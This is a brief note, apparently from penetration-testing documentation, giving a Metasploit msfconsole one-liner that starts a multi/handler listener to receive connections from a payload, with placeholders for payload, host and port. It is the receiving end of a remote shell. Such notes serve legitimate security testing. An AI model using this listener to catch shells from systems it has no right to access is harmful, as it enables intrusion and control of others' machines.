# In order to be able to retrieve the connection of a payload, we have to set a listener with MsfConsole using the following command:

msfconsole -qx 'use multi/handler;set payload <PAYLOAD>; set LHOST <LHOST>;set LPORT <LPORT>;run'